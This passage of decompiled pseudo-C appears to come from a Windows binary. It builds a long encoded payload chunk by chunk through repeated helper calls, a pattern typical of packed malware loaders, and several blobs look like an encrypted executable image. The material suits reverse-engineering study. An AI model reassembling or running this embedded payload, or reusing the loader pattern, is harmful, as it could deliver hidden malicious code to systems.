\"jkbra229+3x5xNC6pRzTOCS0Mpn0V03Ar7mQS95PgyA3KC7xtftI/I4AsAdhtF/xpBLhTEbcKdhmWLAIobrHT90cCe3kS2sIIoxcsaSoD2+9vG7IiJt09AMuZ+5cE0JTG0paQagKfAkURBiQQADJd3eTQFk48XmwPnrwqBvjH3O6urEp/lenE5VAb8iIGMTnYJTHT0pHHURk4x8HJ7IPC6CpWJAXOITJiJNja0cIUORKU6IVOPLEQVQIGLBMAAFvV5AgmckY2CieoTg7RfpL+xsJpAY05Nt0sCOWz/ajebXS50+1Awy5XK2qGKxdXAq4dLcO5xsRhH6Mc0dg4UFPHwMQtT1FV+dTb8oIjIobpztqQFLKVwcdDXDlTx8z5DmwtfwrbLRM2f3MGxiw0KMyufgHhdiPWbALsIok4Eq5SKulHGsvzbS28KRAQ8lXBxt4BZ1AG3cfaD0wVOVTG0y2qyQbTfRa6FgTbOwbRmC36R93a+8JlUBYrAzwuAeLb6g9IVijb1eoHQ1w5U8f2La1NV1V51O3TB/tMBoYsCdsTBtmEOrRd+c9ZWAZx0/lUw0YHlzgpyq/01X5awvGmyPD2+Ib44qJiDiwtSxwfPxd4AdhuKPwpCOoE1YH5NzfS+Oz4uJr5kq5EFekHGsA8RssiPf7C/qsr2+dTOHw4AM4vWvBs3KssuP1fI6kWOD3wlhvvVxuyIhLE+x2oDhPoODj7ORLH+1EHhiw8ldNoFK4kNfWQ3O1Awy7XIH6lekY26UEZORYsPQlHVz4B4XUdFiwZUiUUuMMXPPs\"\n    ;\n    puStack1032 = &stack0xfffffc14;\n    puStack1036 = &stack0xfffffc30;\n    pcStack1040 = 0x406ff6;\n    puStack1036 = fcn.00401091();\n    pcStack1028 = 0xffffffff;\n    puStack1032 = NULL;\n    pcStack1040 = 0x407006;\n    fcn.004011db();\n    if (0xf < puStack964) {\n        pcStack1040 = puStack984;\n        puStack1044 = 0x407016;\n        fcn.0040b0dd();\n    }\n    pcStack1040 = \n    \"5PSEr4sbMrAvWNXVRK76mNhyT23NLGjYtagYrI4cH+1sGBiwl3PTXi04nxdL8Ca4dx+9a+7YNiyZ8OB1OQgsmy6pZKDU/Kyx9guMgfTkBMrLpyTtmBjcogrnnrH86dipqI1NY45+d6VkuDgJNUJYrAzptgeLG20MW+hYG1h11WTYTtjkieA42A2/WawbCcgGNOTbdLAjlniEoG931pNVvUu1s1w2QDj/spcRcSEEa3kt3bTB+XXVfAPB4G3NHGjh5MYbxtRNtgdhGKjwpC2Yny0CkIiI56XgdaA4jV+sGKzrmQn4dOTT/Vj/sFL5B28DcJHNBA0fNzRnrBis19VtvYC1CeAp7aTAV41s3+Ib2tDZtselSVxYrGHc73zu5FiwW70IbOj4E2iHc0DM46XMnLZbG2rf7Gm9nOsbRy/VsKtYi+riieeGH/0Mx6WJX1isbVkQfbSQDz3pUAn6qJKQ4olIT/XEE3iwMGxtlRsJ4AU05NtI3t12G+UAeLrZ509rcGXHxJUhXVS045UAI45ZT9FYp4XkC9CIA8A1O/3ns39d4ElTG+OVCIvxmEPkqNPVQHtWpA3DxGdj47PNXSdVSAwwsQeLYYPEoSMdcCHAz9YD2+trbb375T5AmUDsHuD4J7JrRkx+E29XQ1CcyRgJMJChODtmREjgG+NlOAGGDw+gqViQJXVodXfnOzdgUWhPSiGdVBnjH6gjG008XuhYHS0AbXd3SOa22B8tZEjsGCFx5B0Hi2+TWKrkp2/3fVD8l5NjWVj4ebBdUVNTG5cQfYKRVTt3JdVo\"\n    ;\n    puStack1044 = &stack0xfffffc08;\n    puStack1048 = &stack0xfffffc24;\n    pcStack1052 = 0x40702d;\n    puStack1048 = fcn.00401091();\n    pcStack1040 = 0xffffffff;\n    puStack1044 = NULL;\n    pcStack1052 = 0x40703d;\n    fcn.004011db();\n    if (0xf < puStack976) {\n        pcStack1052 = puStack996;\n        puStack1056 = 0x40704d;\n        fcn.0040b0dd();\n    }\n    pcStack1052 = \n    \"VQdvYGJTTx9g1nRPSife8r+XBaW3sdNcJURQkqj4w97fcLThiOC1NU1R51PX6rCu/z3TTlu9oGro+PYDBeBNH3dtvUhIU+fKYdWU73tTkdYnUQTlq3XgigvYsu8/6F41fNn0IWHkHQeLtKeleFEYkCV1aHV35z3kyQsx1jaUNtjrnwj6+WmgTVtXY1HbFXuKA+A1FvyovU/BqStsgpXn98Pi035Puj4TUMjiuu6bSNn/zLtxt6OvrYKZII2djFiwpagOw1ftrHvIGDsQDRZMvuNTDeQWXOCui/GYQ+SoB87zc3XVS007DAkMNLK1rEv71+OIx3TrWOfzISVsV+14Z8gYOzgNOzc0AawYrLKmWSSawOGwTuhYeDWsb3cD6D1lfB3HT91sDO3kSoj8deRY4Fu9HG7o+BNMmJN+CLi1x0/i+0/7s5FlDIkbp+Dzwlr6uJKCMDgJ8eDYsGtPoHD37OSXEH2CkUratMDogen4w3edJEOgiGvIW5chTVBv1wg+iBunNWTcTG/dBPqJ3uelSHygODv4UPBSquMffYKQSufz/qeF3AnQiN6TSB+dIMvwtSfTRLniHwcnG01wV+hYziM/z9MD/e0j27ZvO2zE0LqlHLMHYeyk8KT7p4V0AdCIA+DavNCGsbTO6+e5tOCg+P8U1bzfK76fKz6UA17wRLd3H1Ke7a/mxoFFioASbVzL/M7R3NP69gHMY7TTSIax/M6qfiWgZ+inKr+b5S9EC8b/y2YDUk7YYIjgONq3+k7E5BzguCUbTexf6FgbUHtvd/wB5m3N6GhP\"\n    ;\n    puStack1056 = &stack0xfffffbfc;\n    puStack1060 = &stack0xfffffc18;\n    pcStack1064 = 0x407064;\n    puStack1060 = fcn.00401091();\n    pcStack1052 = 0xffffffff;\n    puStack1056 = NULL;\n    pcStack1064 = 0x407074;\n    fcn.004011db();\n    if (0xf < puStack988) {\n        pcStack1064 = puStack1008;\n        puStack1068 = 0x407084;\n        fcn.0040b0dd();\n    }\n    pcStack1064 = \n    \"wKRL+xsJcAU05A87VFdNoFK4kNcD3u671SOZnEzsGPpHoB+4dAx0SFtXsJVQB29greFPH2CmwU9KRGxWG+MIEI4bp1g3UadvFjiEyYhO2DCQoThPoNzj7OSZII12uptYZ1SnbyvFKHfIGLCUjwgjTkpT86KOHLHLpm+WWPX9p2/xoaNIyEZztQMMuVy9rhissktrAf8W1T1cVadvQDdud3dOOzcFbcBNSlPwiBvjH6Erut1w0LoykPnLQgUF4E0fdwgz5UpTQfVv+b07IW+0MUikWpCoe60wd1iw4IdlpLC1rEv6X6U8FlBdWFrkqA8bexD72nfnOxAFZcxNSlNwbPBd4K4c4FmwpPinhewG0IgL3KBrRmvAWEn+51Nh456j/zfh4EjoWHidqm93u8M7ENttfUzl/3Kut0+zrhzlWLAkV034WLiQDUhtmW2MnTqwtaxIIWHoHQeLtDKx98Dogen4b/1056WceKA4T8BQ57mI86D4/yqwLfZXp8/2oxtt1dsR7HagOHMNFAvt5N+zriNvgYNk+wjAwtvAd51It6GIs8elaVVYrG/kiqQsgtG03++nhfgE0IgD6D3s82PevzZqHCcy9DStixsynvyrpvrNofrw7pG0m9CGsfzOrn4loGfky7SC0fzfrj4Z7IOY19ZDc7UDDG47wKRyrI4dH454Gw6gIWgsncB8gcmIcrof/uzH5qWf2PK53uT4IW+0MUigWpCorht5BZVIHXcf0OtKU+dTkhhr7vlpoE1bV7AAVQdv0dadcJSaijjhhn6VIRzhHwecnAtP\"\n    ;\n    puStack1068 = &stack0xfffffbf0;\n    puStack1072 = &stack0xfffffc0c;\n    pcStack1076 = 0x40709b;\n    puStack1072 = fcn.00401091();\n    pcStack1064 = 0xffffffff;\n    puStack1068 = NULL;\n    pcStack1076 = 0x4070ab;\n    fcn.004011db();\n    if (0xf < puStack1000) {\n        pcStack1076 = puStack1020;\n        puStack1080 = 0x4070bb;\n        fcn.0040b0dd();\n    }\n    pcStack1076 = \n    \"W/EBG02lU90D9DEMrOQ4sDbJ5KyylxF1+QClT1tATG9XB2/+jJOmbQUExU9KRFFRG+O5fbSQLj3pVLDT/AdvDUhs2lpYesb7DAz27OT0V6iLG9NAKS28bVcHwN4FnWwbdx9QtLSsGPwbCaQGNOTbdLQjlnjgqW93BV1csHeVxD0gcONTG00IrycbpzNgpN1Q3Opv/WTnpdByoDhPwFznudTmoPiLkaRPsZii0KimG23V2zsi3mvJ4T78HCfs9Kq2ixvR9qjx3VDcyBtAYAf/H3dpfqAwbGy119ywqCKMvHjkqAjAV+2MdcgYOaacZfjFvCdWoLr1B7aLGwZz8iNtDK+5kN83hLehiGXOxOj/K3dnYuj5AOLbzqyqLZObI9ML9hCzlaOKOE/DuOe5eOag+PEkLaz0+KfmpAfGmANWvAgVrsdPStoMU/EsGrh014PzIXMsnSP+G0YBH1hqwh/HW7cn5ifTmRaN0b8H7mebmBmlfIHJiN+1aJmhOBhd7BjsIxls6TXkMrCkqJvGIwmjSAEeOaaMazUssu0YR+yfIPz9olw7rS2R5Vxz3owN0cTDYBRxT0onyCXymTKMYm9VLKPpWHuic9GMARo9soxrMTV82eryJ0lrFPcIROb2I4kd5QB4VsfnT2NM5NPh37RBRFFVHwf/FN1G0OvT3UBx3owDVVxpxuiz/VnlbLCtaO+xAfrV5VQjlng+Bm93Ywo9rXgI2U1KU/OkaVEQEOAZp08FNF/RqHGWAb2Et6GIbW1YOOHgREj+HwfxJC0Q+iO9zWsRNnZ353xr\"\n    ;\n    puStack1080 = &stack0xfffffbe4;\n    puStack1084 = &stack0xfffffc00;\n    pcStack1088 = 0x4070d2;\n    puStack1084 = fcn.00401091();\n    pcStack1076 = 0xffffffff;\n    puStack1080 = NULL;\n    pcStack1088 = 0x4070e2;\n    fcn.004011db();\n    if (0xf < puStack1012) {\n        pcStack1088 = puStack1032;\n        puStack1092 = 0x4070f2;\n        fcn.0040b0dd();\n    }\n    pcStack1088 = \n    \"3MQ0O/mIHCk2aJ/3wqB8uKsSfUyyuZCJ+xU7rKzsbzvJiBBfTve9cyDAVDFeKFiQqISehzI9QA7I4Dm/N+IYrORLawH3HlzClV+BE0n75ISjyTjnCyc5M1ytbVpv1CEYfOeZO2xpuICrORtCC/qzIWHiTLZGB51+kBZo//cjWTNOqS1mI7y0gNfbO6Ss5Ps1ddkeyuvzIBNlglfeZM5X8Gien+lIfr+QSOBr4T51m0/rmTuNDG+CM0bXmXuvjKDuh2exhoefeaDTo2ftxHrvhzXUPr/b6Rj2p4fR2O4Xz6HohjfP9NyVJWQc4Pg/kYg1dtxvG3I5e4z8F1vjBak41rrTGSGtDKuNgme6v9C000ppEpL8gn6/noltcbT/2e4vBx+U/vzlGfvRUgDLaw9LC0sImzPaa+szV69sqmwdobIBHplbptxS9qeGkQXBHPuVfrrR7kpT5/lv8GPdrP4ZsKQrtIz7y0vLgQVADsjgUrpd8Bms5Jkg9/CoWbCkm5EZtSCKyYgrcO8qtrOFRUJYrLORnRz3Klo5oyEHlCG3mAHfFDulbGt1QDzp7C0VdY6dPW8dXJHGLPXEcaV4Zliw60BrfViA633CkRcoD62OWapt8KZRwvjJhyqRt2nX5LH/vSVPoG9RDHE5HCzzL+28tVjHb4e12LbhiJQbjdWqGqyQAN2IcuZYxLGVCJar+OSGtXi244iUP43FqhuskQ1rxaj+GbAnZ1kZlSSKyYjztmu1PCLxtS9lWONg1ZJz15E90UwAnwpxlgNOk4UQZqA4Oe2okeTsl60A\"\n    ;\n    puStack1092 = &stack0xfffffbd8;\n    puStack1096 = &stack0xfffffbf4;\n    pcStack1100 = 0x407109;\n    puStack1096 = fcn.00401091();\n    pcStack1088 = 0xffffffff;\n    puStack1092 = NULL;\n    pcStack1100 = 0x407119;\n    fcn.004011db();\n    if (0xf < puStack1024) {\n        pcStack1100 = puStack1044;\n        puStack1104 = 0x407129;\n        fcn.0040b0dd();\n    }\n    pcStack1100 = \n    \"/bRUO+FA8ZCq+JD8hZt/4gHd5Kr0rPOu19wXOXTkSLDQ5dterD+VUJJZsOKI4Dg5gFz27OTrIfh05FDEll+ZkKj4gPyim37oT+XgqvSsG6zkHGnNhAoYsAyILIMrNrBPjcCqoYjlOLC1JS1cClzgpyrXmOsvTQVTZAe1iFhYsOCI4DiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDgiOA4sLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLC1rBis5Bzg+HTkWLCkqFiQqPiQiIgYsOCI4DiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDgiOA4sLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLC1rBis5Bzg+HTkWLCkqFiQqPiQiIgYsOCI4DiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDgiOA4sLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLC1rBis5Bzg+HTkWLCkqFiQqPiQiIgYsOCI4DiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDgiOA4sLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLC1rBis5Bzg+HTkWLCkqFiQqPiQiIgYsOCI4DiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDgiOA4sLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw5FPgOLC1rBis5Bzg+HTkWLKnr1iVrfyQi4sTsOCI4DiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDgiOA4sLWsGK3kHOD5dORYsaSoWJGo+JCK\"\n    ;\n    puStack1104 = &stack0xfffffbcc;\n    puStack1108 = &stack0xfffffbe8;\n    pcStack1112 = 0x407140;\n    puStack1108 = fcn.00401091();\n    pcStack1100 = 0xffffffff;\n    puStack1104 = NULL;\n    pcStack1112 = 0x407150;\n    fcn.004011db();\n    if (0xf < puStack1036) {\n        pcStack1112 = puStack1056;\n        puStack1116 = 0x407160;\n        fcn.0040b0dd();\n    }\n    pcStack1112 = \n    \"iBiw4ojgOLK1rBiu5Bzg+3TkWLOkqFiTqPiQi4gYsOSI4Di0tawYqOQc4Px05Fi1pKhYlaj4kI2IGLDliOA4sLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLC1rBit5Bzg+XTkWLKkqFiSqPiQi4gYsOOI4Di0tawYqOQc4P105Fi1pKhYlqj4kI6IGLDniOA4t7WsGKTkHODwdORYuaSoWJmo+JCCiBiw6ojgOLu1rBin5Bzg9HTkWLykqFidqPiQhYgYsOCI4DiwtawYreQc4Pp05FizpKhYlKj4kI2IGLDniOA4ubWsGKHkHODpdORYqaSoWLGo+JC5iBiwoYjgONG1rBgt5BzgOXTkWLGlqFgRqfiQiYoYsOGL4DixsawYreIc4Pl85FixqKhYkbj4kImQGLDhqOA4sYWsGK2kHOD5FORYsKSoWJCo+JCYmQqw6I/pPrqwpxyg5xHi9nXrWLCkqFiQqPiQiIgYsOCI8iukobkNuvIK9u9j80+ovLBAiLDgiJGRAan5kfkhqq+2Arb+Bvribv5Cqr6yQouz44uTkwOr+5P7I6uutwOw+AD85Gj4RKy4tESMtOSMlJQErPyU/CSsqbAEsPgA/OVp+UWtubVFjbXljZWVBa39lf0lraixBbH5Af3laflFsKWqW5Ss/ZWOjh6254/nP7i9pBCk7BTo8X3tUbmtoVGaovKagoISuuqC6jK6v6YSp+8X6/N/71O7r6NTm6Pzm4SEFLzshOw0vLmgFKDoEOz0eOhUvKikVJyk9JyEhBS87YXtNb24oRWh\"\n    ;\n    puStack1116 = &stack0xfffffbc0;\n    puStack1120 = &stack0xfffffbdc;\n    pcStack1124 = 0x407177;\n    puStack1120 = fcn.00401091();\n    pcStack1112 = 0xffffffff;\n    puStack1116 = NULL;\n    pcStack1124 = 0x407187;\n    fcn.004011db();\n    if (0xf < puStack1048) {\n        pcStack1124 = puStack1068;\n        puStack1128 = 0x407197;\n        fcn.0040b0dd();\n    }\n    pcStack1124 = \n    \"6RHt9XnpVb2ppVWdpfWdhYUVve2F7TW+u6IWouoS7vZ66la+qqZWnqb2noaGFr7uhu42vruiFqLqEu72eupWvqqmVp6m9p6Ghha+7obuNr67ohai6hLu93vrV7+rp1efp/efh4cXv++H7ze/uqMXo+sT7/d761e/q6dXn6f3n4eHF7/vh+83v7qjF6PrE+/3e+tXv6unV4C46ICYmAig8JjwKKClvAi89Azw6GT0SKC0uEiAuOiAmJgIoPCY8CigpbwIvPQM8Ohk9EigtLhIgLjogJiYCKDwmPAooKW8CLz0DPDoZPRIoLS4SIC46ICYmAig8JjwKKClvAi89Azw6GT0SKC0uEiAuOiAmJgIoPCY8CigpbwIvfUN8ell9UmhtblJgbnpgZmZCaHxmfEpoaS9Cb31DfHpZfVJobW5SYG56YGZmQmh8ZnxKaGkvQm99Q3x6WX1SaG1uUmBuemBmZkJofGZ8SmhpL0JvfUN8ell9UmhtblJgbnpgZmZCaHxmfEpoaS9Cb31DfHpZfVJobW5SYG56YGJiRqx44nkObW0qhmr5RTh8XXtWbqlolmbqfORhIkUse2J7Tm9tKEZouUS4fZ16lm/padZn6n3kZiJCLHwifA5obS9Gb3lDeHpdfVZoaW5WYKp6pGaiQqx8onyOaK0vhm/5Q/h63X3WaOlu1mDqeuRnIkMsfSJ9DmktLgZuOUI4e118Vmlpb1ZhantkZ2JDbH1ifU5pbS5GbnlCeHtdfFZpqW+WYap7pGeiQ6x9on2Oaa0uhm65Qrh7nXyWaalvlmH\"\n    ;\n    puStack1128 = &stack0xfffffbb4;\n    puStack1132 = &stack0xfffffbd0;\n    pcStack1136 = 0x4071ae;\n    puStack1132 = fcn.00401091();\n    pcStack1124 = 0xffffffff;\n    puStack1128 = NULL;\n    pcStack1136 = 0x4071be;\n    fcn.004011db();\n    if (0xf < puStack1060) {\n        pcStack1136 = puStack1080;\n        puStack1140 = 0x4071ce;\n        fcn.0040b0dd();\n    }\n    pcStack1136 = \n    \"qe+Rn4kPsfeJ9zmntLsZu+UL4e9181mnpb9Zh6nvkZCJALH4ifg5qLS0GbTlBOHgdfxZqKWwWYip4JGQiQCx+Yn5Oam0tRm15QXh4XX9WamlsVmJqeGRkYkBsfmJ+TmptLUZteUF4eF1/VmppbFZianhkZGJAbH5ifk5qbS1GbblBuHidf5ZqqWyWYqp4pGSiQKx+on6Oaq0thm25Qbh4nX+WaqlslmKqeKRkokCsfqJ+jmqtLYZtuUG4eJ1/lmrpbNZi6njkZOJA7H7ifs5q7S3GbflB+Hjdf9Zq6WzWYup45GTiQOx+4n7Oau0txm35Qfh43X/Wauls1mLqeORlIkEsfyJ/DmstLAZsOUA4eR1+FmspbRZjKnkkZSJBLH8ifw5rLSwGbDlAOHkdfhZrKW0WYyp5JGUiQSx/In9ObC1rBit5R3h+nbmWrKmqlqTq/uTi4sbs+OL4zuztq8bqOAY5Pxw4Fy0oKxclKz8lIyMHLTkjOQ8tLGoHKjgGOT9ceFdtaGtXZWt/ZWNjR215Y3lPbWwqR2p4Rnl/XHhXbWhrV2Vrf2VjY0dteWN5T21sKkdqeEZ5f1x4V21oa1dlq7+lo6OHrbmjuY+trOqHqriGub+cuJetqKuXpau/paOjh625o7mPrazqh6q4hrm/nLiXrairl6Wrv6Wjo4etuaO5j62s6oequIa5v5y4l62oq5elq7+lo6OHrbmjuY+trOqHqriGub+cuJetqKuXpau/paOjh625o7mPrazqh6r4xvn/3PjX7ejr1+Xr/+Xj48ft+eP5z+3\"\n    ;\n    puStack1140 = &stack0xfffffba8;\n    puStack1144 = &stack0xfffffbc4;\n    pcStack1148 = 0x4071e5;\n    puStack1144 = fcn.00401091();\n    pcStack1136 = 0xffffffff;\n    puStack1140 = NULL;\n    pcStack1148 = 0x4071f5;\n    fcn.004011db();\n    if (0xf < puStack1072) {\n        pcStack1148 = puStack1092;\n        puStack1152 = 0x407205;\n        fcn.0040b0dd();\n    }\n    pcStack1148 = \n    \"sqsfq+Mb5/9z41+3o69fl6//l4+PH7fnj+c/t7KrH6vjG+f/c+Nft6OvX5ev/5ePjx+354/nP7eyqx+r4xvn/3PjX7ejr1+Xr/+Xj48ft+eP5z+3sqsfq+Mb5/9z41+3o69fl6//l4+PH7fnj+c/t7KrH6vjG+f/c+Nft6OvX5ev/5ePjx+354/nP7eyqx+r4xvn/3PjX7ejr1+Xr/+Xj48ft+eP5z+3sqsfq+Mb5/9z41+3o69fl6//l4+PH7fnj+c/t7KrH6vjG+f/c+Nft6OvX5ev/5ePjx+354/nP7eyqx+r4xvn+HTkWLGkqFiWqPiQqIgYsPCI4DiQtawYLOQc4Ph15FiwpqhYkKv4kFSNGLDgiOA4sLWkEKXtFenyfu5Suq6iUpuj85uDgxO764PrM7u+pxOg6BDs9HjoVLyopFScpPSchIQUvOyE7DS8uaAUoOgQ7PV56VW9qaVVnaX1nYWFFb3the01vbihFaHpEe31eelVvamlVZ2l9Z2FhRW97YXtNb24oRWh6RHt9XnpVb2ppVWQqPiQiIgYsOGJ4TmxtK0ZruYe4vp25lqypqpakqr6kouLG7Pji+M7s7avG6/nH+P7d+dbs6erW5Or+5OLixuz5IzkPLSxqByo4Bjk/HDgXLSgrFyUrPyUjIwctOSM5Dy0sagcqOAY5Pxw4Fy0oKxclKz8lIyMHLTkjOQ8tLGoHKnhGeX9ceFdtaGtXZWt/ZWNjR215Y3lPbWwqR2p4Rnl/XHhXbWhrV2Vrf2VjY0dteWN5T21sKkdqeEZ5f1x4V21\"\n    ;\n    puStack1152 = &stack0xfffffb9c;\n    puStack1156 = &stack0xfffffbb8;\n    pcStack1160 = 0x40721c;\n    puStack1156 = fcn.00401091();\n    pcStack1148 = 0xffffffff;\n    puStack1152 = NULL;\n    pcStack1160 = 0x40722c;\n    fcn.004011db();\n    if (0xf < puStack1084) {\n        pcStack1160 = puStack1104;\n        puStack1164 = 0x40723c;\n        fcn.0040b0dd();\n    }\n    pcStack1160 = \n    \"oa1dla39lY2NHbXljeU9tbCpHanhGeX9ceFdtaGtXZWt/ZWNjR215Y3lPbWwqR2p4Rnl/XHhXbWhrV2Vrf2QiIgYsOGI4DiztawYq+Qc4Pd05FivpKhYr6j4kPeIGLAfiOA4T7SsGFPnHOAHc+RYT6uoWG+3+JB3txiwH/fgOE9KrBi89Q7g8HPtXrqho1ycq/WShokXsOGJ4DixtawYqOQc4Ph05FizpKhYlKj4kI2IGLDmiOA4t7WsGKTkHODxdORYuqSoWJuo+JCFiBiw74jgOKG1rBi/5Bzg73TkWKukqFiPqPiQq4gYsMuI4DiDtawYl+Qc4Lt05FjjpKhY86j4kPuIGLBjiOA4E7WsGG/kHOAbdORYsqWoWJCo+JCIiBiwHFLgOLC1rBis5Bzg2K/kWLB0qFiQqPiQiIgYsOCI4DiwtawYrOQc4Pyv5FiwpKhYlKux49j6d9OF+5NXwvPJediRboWoBoEr1crcWNvtqt7NxCuCzuyMVLC1rBis5Bzg+HTkWLCkqFiQqPiQiIgYsOCI4DiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDgiOA4sLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLC1rBis5Bzg+HTkWLCkqFiQqPiQiIgYsOCI4DiwtawYrOQc4Ph05FiwpKhYkKj4kIiIGLDgiOA4sLWsGKzkHOD4dORYsKSoWJCo+JCIiBiw4IjgOLC1rBis5Bzg+HTkWLCkqFiQqPiQiIgYsOCI4DiwtawYrOQc4Ph05FiwpKhYMV3ohR4OMv88\"\n    ;\n    puStack1164 = &stack0xfffffb90;\n    puStack1168 = &stack0xfffffbac;\n    pcStack1172 = 0x407253;\n    puStack1168 = fcn.00401091();\n    pcStack1160 = 0xffffffff;\n    puStack1164 = NULL;\n    pcStack1172 = 0x407263;\n    fcn.004011db();\n    if (0xf < puStack1096) {\n        pcStack1172 = puStack1116;\n        puStack1176 = 0x407273;\n        fcn.0040b0dd();\n    }\n    pcStack1172 = \n    \"E5UDSiTZY2t4apwu861HRJQQY+ks/RfIruDfVRe+/vVLhK7ydm3VVksTf7CkqFiQqPiQiIgYsGbEHzVitgBBGaVPyQW6FhsXi4aWYBhaxap1t5DgiOA4bEexMyh/b5hf58kvJzPTEjY2kWeI7Yr6860pytH0RpASxXmnpNF6iauzwpH+t+zWqFzfoxkjTFCR2Ot8NOGgCBOkwy6wpKhYkKj4kIiIGLAscGA+dylNbnBpsJYl/UgqcykELVM9GeVTXevfJxRMXWwoSX0zdfmHJ/kMcmE8RDJMPha6WBD6mjwVAl0vLk16eHiwgibsSC5wOEtyQD4X/VIU65o6AQxVLyhJaHZ++ZVn6Ao/YTFNck4kFOIXAerZJV0WW3EhQ3BrMf2SP/8NPC8uSzZGPBm6UhD6mjAZFVBoYFxrfXH1lSOhFCxmLQQtUScbukgU68V/AwlQZCVCMnFu9ZZn/hArYS4EN042VPdfFbTOOhAOEmklWDJ5b/mDZ/0AOC8xRz9HMBa6WgPxzDwfARJ3IE4yeXLuhS7pSCxmLl0yVyJU5UIc+tk/AkxMZjxDbGsx+5Mi6RdydzxbNUEwCrpYGfHaN10DUW0pAHlzdOiFI6EBMHcvQTtQfRrzTwb90z1dAlNvYFltfX7/jy+hFyducU0wQjMU819d9dMhFgUSdCVCenBqsJUo/w0udy4ELEIiDPNJXfnVIgQJTGZgRm1wc7CUP+BIKWIxQ3JBMBbxLxIlXnOBWhCTjycv8V7qEWcSqQW/ke6ZkKj4kDBxmLZ2BE4bdmIJazE46aBp\"\n    ;\n    puStack1176 = &stack0xfffffb84;\n    puStack1180 = &stack0xfffffba0;\n    pcStack1184 = 0x40728a;\n    puStack1180 = fcn.00401091();\n    pcStack1172 = 0xffffffff;\n    puStack1176 = NULL;\n    pcStack1184 = 0x40729a;\n    fcn.004011db();\n    if (0xf < puStack1108) {\n        pcStack1184 = puStack1128;\n        puStack1188 = 0x4072aa;\n        fcn.0040b0dd();\n    }\n    pcStack1184 = \n    \"6bMtFLJHXcVmomCj5TDdUTOJzbC1rBis5Bzg+HTkWFNdKF5xNB7zSRTqjHMZFEpzdgMxOm6zwziAbh1sM1w7TSVVwkIB/YxzEBBObyVPf2t084hk9UkpdCoFOEwjFbtOA/TTPRIPWmYoIRRbU8jca7xpVG8K36xNwOP1VFjglei1mfZIZ6lghzVO2WHhiGV6YdgtkKj4kIiIGLDgiOA4YM8BDgT21JpPPXtgD7JpdhoCr8fZ/1lKt4XyMzN57g4W6GxI6n37Fu4qdNRwqJfNWfK1pnyeIkwKo11DUsaGyjf/1Bgl3LbTHdcaZvvO6zjX9nlPsLWsGKzkHOD4dORYYN4FTj6hMPQ2nMOIX54ho3j+488nBUAhMDbTvmoNLhueeGmUQ5LrxPTJqhVc876JmD/Vqdw5FuuxaCPLrGWLgG55UwqwiC7wOncjrRfllXobQWvtpaQTxWSTkMWciAJ/ayvraAu0VyiJ7ltHaGs3aCaIKzAAtwFnh06jCbCIlK6P5QudBP9TOr0GI54gu2yeTF9zANiIUos2ZLmgIKocrj8/BK5oa8kpnHx2BAC3Lq7fC3GesIjA06SZTqa55Dy2LfBU7iq7urUdAc7FGJeAsCBdsfggqhr2dQmnhex02V/445eLALdLY1rC3LVwl6amB+WoAxflv4VE13dDILtXZlByLk4Yl5sdvX4MUCCqFaPuM9G7aGtssvY2uubAqK4NAysT4FuJFZzeOWWSPPvXRsiQiOZupwoX7cpFXhiX7cNGKa+KC7Q8Tq7iUFZoa7Q/VvvmKyupwD0q\"\n    ;\n    puStack1188 = &stack0xfffffb78;\n    puStack1192 = &stack0xfffffb94;\n    pcStack1196 = 0x4072c1;\n    puStack1192 = fcn.00401091();\n    pcStack1184 = 0xffffffff;\n    puStack1188 = NULL;\n    pcStack1196 = 0x4072d1;\n    fcn.004011db();\n    if (0xf < puStack1120) {\n        pcStack1196 = puStack1140;\n        puStack1200 = 0x4072e1;\n        fcn.0040b0dd();\n    }\n    pcStack1196 = \n    \"SzWoSJPZzap+eLU8+30nnf+ODyC7ALW7wkgma4se5TIUH/8gqhnMKiaBxUN1xoevCVaYALe8oWAAcudwl4maLzKZprnksKBedY4N4GcAGBo8v1gYl2U64l3JF6a1djFQfdZ1aGskHbtre+YrqacHSDNTjnCXvfASdoEAV8SPTeieo4wgu52UoXEpLdiI2ESloxvxIKpMEtDVPc1DdRmmrr3KDqWole1do5jvcJdWK6oEX5A8+wCbeG2lxyC7h9OdVKYpM4nnWLt4TCcgqlwfoWT1vHd0Xu9G03RxwKjMmrbLFK9Ik0K1QtwU0RflTVl+N3XmKrvi/g595yUYlwHbayvraKW1fO8CQHvbqHSR+fJiWCTAqEbVHoOb2HCXrQdW1MamF+V69NaVJAbgpO6Op00Z0xiXbbIUwASGhbUyxKYT0b6odEQ3aRJH8QC3AAQ3PrhpcJcB06WmSk88+3Aj+HTkWLCkqFj1R6D690yIxraf0Fs0cNIY1and0CV9tUWuVsxe2WiZ5Seqafki9CIe85bSZxHIIvDWqiRenNqkFmi8JK+Cz9vEojJjRFNnez/yQ/rzWS/IQVqDixXjCbnwLvzpgk3UgFViVR5YMT9Hufh8TkOjkgs9xWeY6MyzMfrvN241JpgCHcLgbquqG5gEympFQGqioZUoXH2dWHFFAJalfEZlMqDQVGxSaaEr4SJu8picqe1fzfy4K3M+dz8luKYAg5MY3m29C6I7HXM7qHR1pqyH+ApKnhaiGlVWgtzaSSw+/ZdMEEZb6dqBfo+pSe6zBlN5SDv0\"\n    ;\n    puStack1200 = &stack0xfffffb6c;\n    puStack1204 = &stack0xfffffb88;\n    pcStack1208 = 0x4072f8;\n    puStack1204 = fcn.00401091();\n    pcStack1196 = 0xffffffff;\n    puStack1200 = NULL;\n    pcStack1208 = 0x407308;\n    fcn.004011db();\n    if (0xf < puStack1132) {\n        pcStack1208 = puStack1152;\n        puStack1212 = 0x407318;\n        fcn.0040b0dd();\n    }\n    pcStack1208 = \n    